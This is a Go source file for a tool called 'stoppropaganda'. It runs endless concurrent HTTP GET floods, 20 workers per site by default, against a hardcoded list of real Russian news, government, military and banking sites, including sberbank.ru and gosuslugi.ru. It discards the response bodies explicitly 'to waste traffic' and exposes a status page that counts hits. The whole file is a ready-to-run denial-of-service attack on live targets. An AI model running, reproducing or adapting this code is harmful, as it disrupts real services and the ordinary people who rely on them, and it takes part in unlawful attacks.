package main

import (
	"encoding/json"
	"flag"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"

	"github.com/peterbourgon/ff/v3"
)

var links = []string{
	"https://lenta.ru/",
	"https://ria.ru/",
	"https://ria.ru/lenta/",
	"https://www.rbc.ru/",
	"https://www.rt.com/",
	"http://kremlin.ru/",
	"http://en.kremlin.ru/",
	"https://smotrim.ru/",
	"https://tass.ru/",
	"https://tvzvezda.ru/",
	"https://vsoloviev.ru/",
	"https://www.1tv.ru/",
	"https://www.vesti.ru/",
	"https://online.sberbank.ru/",
	"https://sberbank.ru/",
	"https://gosuslugi.ru/",
	"https://mil.ru/",
	"https://iz.ru/",
	"https://vz.ru/",
}

type Website struct {
	Link         string `json:"url"`
	Requests     uint   `json:"requests"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`

	Counter_code100 uint `json:"status_100"`
	Counter_code200 uint `json:"status_200"`
	Counter_code300 uint `json:"status_300"`
	Counter_code400 uint `json:"status_400"`
	Counter_code500 uint `json:"status_500"`

	mux *sync.RWMutex
}

var websites = []*Website{}

var httpClient http.Client

var fs = flag.NewFlagSet("stoppropaganda", flag.ExitOnError)
var (
	flagWorkers   = fs.Int("workers", 20, "workers for each website")
	flagUserAgent = fs.String("useragent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "User agent used in HTTP requests")
	flagTimeout   = fs.Duration("timeout", 10*time.Second, "timeout of HTTP request")
	flagBind      = fs.String("bind", ":8049", "bind on specific host:port")
)

func main() {
	ff.Parse(fs, os.Args[1:], ff.WithEnvVarPrefix("SP"))

	for _, link := range links {
		w := &Website{
			Link: link,
			mux:  &sync.RWMutex{},
		}
		websites = append(websites, w)
		go w.Start()
	}

	http.HandleFunc("/status", status)
	log.Println("Started!")
	panic(http.ListenAndServe(*flagBind, nil))
}

func status(w http.ResponseWriter, req *http.Request) {
	tmpWebsites := []Website{}
	for _, ws := range websites {
		ws.mux.RLock()
		tmpWebsites = append(tmpWebsites, *ws)
		ws.mux.RUnlock()
	}
	content, err := json.MarshalIndent(tmpWebsites, "", "    ")
	if err != nil {
		http.Error(w, "failed to marshal data", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(200)
	w.Write(content)
}

func (ws *Website) Start() {
	websiteURL, err := url.Parse(ws.Link)
	if err != nil {
		panic(err)
	}

	f := func() {
		for {
			// Create request
			req, err := http.NewRequest("GET", ws.Link, nil)
			if err != nil {
				panic(err)
			}

			// Set headers
			req.Header.Set("Host", websiteURL.Host)
			req.Header.Set("User-Agent", *flagUserAgent)
			req.Header.Set("Accept", "*/*")

			// Perform request
			resp, err := httpClient.Do(req)
			if err != nil {
				ws.mux.Lock()
				ws.Requests++
				ws.Errors++
				ws.LastErrorMsg = err.Error()
				ws.mux.Unlock()
				continue
			}

			// Increase counters
			ws.mux.Lock()
			ws.Requests++
			if resp.StatusCode >= 100 && resp.StatusCode < 200 {
				ws.Counter_code100++
			} else if resp.StatusCode >= 200 && resp.StatusCode < 300 {
				ws.Counter_code200++
			} else if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				ws.Counter_code300++
			} else if resp.StatusCode >= 400 && resp.StatusCode < 500 {
				ws.Counter_code400++
			} else if resp.StatusCode >= 500 && resp.StatusCode < 600 {
				ws.Counter_code500++
			}
			ws.mux.Unlock()

			// Download (and discard) response body to waste traffic
			_, err = io.Copy(ioutil.Discard, resp.Body)
			if err != nil {
				ws.mux.Lock()
				ws.Errors++
				ws.mux.Unlock()
			}
			resp.Body.Close()
		}
	}

	for i := 0; i < *flagWorkers; i++ {
		go f()
	}
}

func init() {
	httpClient = http.Client{
		Timeout:       *flagTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}
}
